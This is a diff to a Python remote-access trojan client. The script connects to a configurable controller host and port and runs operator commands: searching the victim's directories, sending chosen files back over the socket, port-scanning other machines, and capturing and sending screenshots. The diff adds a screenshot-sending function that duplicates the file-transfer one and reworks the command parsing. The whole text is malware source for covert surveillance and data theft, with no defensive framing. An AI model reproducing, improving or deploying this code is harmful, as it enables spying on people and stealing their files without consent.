@@ -8,9 +8,22 @@ Host = '127.0.0.1'  #Change this
 Port = 8080    #Change this
 
 
-def transfer(s,path):
-    if os.path.exists(path):
-        f = open(path, 'rb')
+def transfer(s,source):
+    if os.path.exists(source):
+        f = open(source, 'rb')
+        packet = f.read(1024)
+        while packet != '':
+            s.send(packet)
+            packet = f.read(1024)
+        s.send('DONE')
+        f.close()
+
+    else: # the file doesn't exist
+        s.send('Unable to find out the file')
+
+def screenshot(s,source):
+    if os.path.exists(source):
+        f = open(source, 'rb')
         packet = f.read(1024)
         while packet != '':
             s.send(packet)
@@ -49,7 +62,7 @@ def connect():
             break
 
         elif 'search' in command: #syntax search path ext
-            null, path, ext = command.split(" ")
+            null, path, ext = command.split(' ')
             list = ''
 
             for dirpath, dirname, fiels in os.walk(path):
@@ -59,11 +72,11 @@ def connect():
             enc_list = list.encode('utf-8')
             s.send(enc_list)
 
-        elif 'grab' in command:  #syntax grab*path
-            grab,path = command.split('*')
+        elif 'grab' in command:  #syntax grab source_path destination_path
+            null1,source,null2 = command.split(' ')
 
             try:
-                transfer(s,path)
+                transfer(s,source)
             except Exception as e:
                 s.send ( str(e) )
                 pass
@@ -72,13 +85,13 @@ def connect():
             null,ip,ports = command.split(' ')
             scanner(s,ip,ports)
 
-        elif 'screencap' in command: #syntax schreenshot
+        elif 'screencap' in command: #syntax schreenshot destination_path
             dirpath = tempfile.mkdtemp()
             ImageGrab.grab().save(dirpath+'\img.jpg', "JPEG")
-            path = dirpath + '\img.jpg'
+            source = dirpath + '\img.jpg'
 
             try:
-                transfer(s,path)
+                screenshot(s,source)
                 shutil.rmtree(dirpath)
             except Exception as e:
                 pass
